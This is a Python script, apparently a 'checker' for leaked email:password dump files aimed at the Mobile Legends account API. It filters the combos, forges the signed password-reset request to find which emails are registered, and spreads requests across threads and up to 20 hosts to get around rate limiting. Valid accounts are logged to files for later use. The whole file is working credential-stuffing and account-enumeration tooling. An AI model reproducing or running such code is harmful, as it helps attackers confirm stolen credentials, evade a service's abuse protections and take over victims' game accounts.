import hashlib, ltp, requests as req, re, json, base64, os, h2
from ltp import printf
import itertools, time


"""check all the valid lines from the valid list"""
def md5(string):
    return hashlib.md5(string.encode('utf-8')).hexdigest()

def chunker(n, iterable):
    it = iter(iterable)
    while True:
        chunk = tuple(itertools.islice(it, n))
        if not chunk:
            return
        yield chunk


def check(line):
    global dump
    line=dump[line]
    if ":" in line and "@" in line and line not in str(ltp.get("live/shits")):
        pass
    else:
        return
    for host in range(1, 21):
        try:
            split=line.split(":")
            if bool(re.match(r'\w*[A-Z]\w*', split[1])) and True in [char.isdigit() for char in split[1]]:
                pass
            else:
                return
            account=split[0]
            md5pwd=md5(split[1])
        except:
            return
        
        sign=md5("email="+account+"&op=mail_resetpwd")
        data='{"op": "mail_resetpwd", "sign": "'+sign+'", "params": {"email": "'+account+'"}, "lang": "en"}'
        
        headers="""
    Host:accountmtapi.mobilelegends.com
    content-type:application/json
    x-requested-with:com.mobile.legends
        """
        p=h2.h2("https://accountmtapi.mobilelegends.com", headers, data, host=host)[1]
        if "Error_Success" in p:
            printf("[VALID] -> "+line+"\n", 92)
            ltp.app("live/valid.hpp", line)
        elif "Error_FailedTooMuch" in p:
            if host==20:
                ltp.app("live/tryagain.hpp", line)
                printf("[ALLFAILED] -> "+line+"\n", 91)
                time.sleep(60*5)
                return
            else:
                printf("[FailedTooMuch] -> "+line, 91)
            continue
        elif "Error_PwdErrorTooMany" in p:
            printf("[ERROR] -> "+line+"\n", 91)
            ltp.app("live/pwd_err.hpp", line)
        else:
            printf("[INVALID] -> "+line, 91)
        ltp.app("live/shits", line)
        return

# check("angou:Angou")
for file in os.listdir('dump'):
    if ".txt" not in file:
        continue
    dump=ltp.get("dump/"+file)
    chunks = list(range(0, len(dump)))
    for chunk in chunker(500, chunks):
        with ltp.exe(50) as exe:#200
            exe.map(check, chunk)
            del exe, chunk
    del dump, chunks, file




